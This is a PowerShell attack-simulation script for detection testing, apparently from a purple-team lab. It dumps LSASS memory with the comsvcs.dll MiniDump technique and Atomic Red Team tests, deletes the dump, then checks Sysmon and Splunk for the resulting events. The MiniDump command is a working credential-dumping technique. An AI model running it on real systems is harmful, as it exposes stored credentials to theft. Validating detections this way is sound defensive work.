<![CDATA[# ============================================================
# Atomic Red Team Simulation: T1003.001 — Credential Dumping
# Target: Windows Server (run locally on target)
# MITRE ATT&CK: T1003.001 — LSASS Memory
# ============================================================
#Requires -RunAsAdministrator

Write-Host "=============================================" -ForegroundColor Red
Write-Host " ATTACK SIMULATION: T1003.001 — LSASS Dump" -ForegroundColor Red
Write-Host "=============================================" -ForegroundColor Red
Write-Host ""
Write-Host "[!] WARNING: This simulation accesses LSASS memory." -ForegroundColor Yellow
Write-Host "[!] Windows Defender may block some actions." -ForegroundColor Yellow
Write-Host ""

# ── Method 1: Atomic Red Team ──
Write-Host "[*] Method 1: Atomic Red Team T1003.001..." -ForegroundColor Yellow
try {
    Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force -ErrorAction SilentlyContinue
    Invoke-AtomicTest T1003.001 -TestNumbers 1,2 -ErrorAction SilentlyContinue
    Write-Host "[✓] Atomic Red Team tests completed" -ForegroundColor Green
} catch {
    Write-Host "[!] Atomic Red Team not installed, using manual simulation" -ForegroundColor Yellow
}

# ── Method 2: comsvcs.dll MiniDump ──
Write-Host ""
Write-Host "[*] Method 2: LSASS dump via comsvcs.dll MiniDump..." -ForegroundColor Yellow

$dumpPath = "C:\Windows\Temp\lsass_test.dmp"

try {
    $lsassProcess = Get-Process lsass -ErrorAction Stop
    $lsassPID = $lsassProcess.Id
    Write-Host "  [+] LSASS PID: $lsassPID" -ForegroundColor Gray

    # This command generates Sysmon Event 10 (ProcessAccess) targeting lsass.exe
    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID $dumpPath full 2>$null
    
    if (Test-Path $dumpPath) {
        Write-Host "[✓] LSASS dump created at $dumpPath" -ForegroundColor Green
        # Immediate cleanup
        Remove-Item $dumpPath -Force
        Write-Host "[✓] Dump file cleaned up" -ForegroundColor Green
    } else {
        Write-Host "[!] Dump creation blocked (likely by AV)" -ForegroundColor Yellow
    }
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}

# ── Method 3: Process Access Simulation ──
Write-Host ""
Write-Host "[*] Method 3: Direct LSASS process access..." -ForegroundColor Yellow

try {
    $lsassHandle = (Get-Process lsass -ErrorAction Stop).Handle
    Write-Host "[✓] LSASS handle accessed (generates Sysmon Event 10)" -ForegroundColor Green
} catch {
    Write-Host "[!] LSASS access denied (expected in hardened environments)" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "[✓] Credential dump simulation complete" -ForegroundColor Green
Write-Host "[*] Check Splunk: index=sysmon EventCode=10 TargetImage=*lsass.exe*" -ForegroundColor Cyan
Write-Host "[*] Check Splunk: index=sysmon EventCode=1 CommandLine=*comsvcs*" -ForegroundColor Cyan
Write-Host ""

# ── Verification ──
Write-Host "[*] Recent Sysmon LSASS access events:" -ForegroundColor Yellow
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=10} -MaxEvents 10 |
    Where-Object { $_.Message -match "lsass" } |
    Select-Object TimeCreated, @{N='SourceImage';E={($_.Message -split "`n" | Select-String "SourceImage:").ToString().Trim()}} |
    Format-Table -AutoSize
]]>
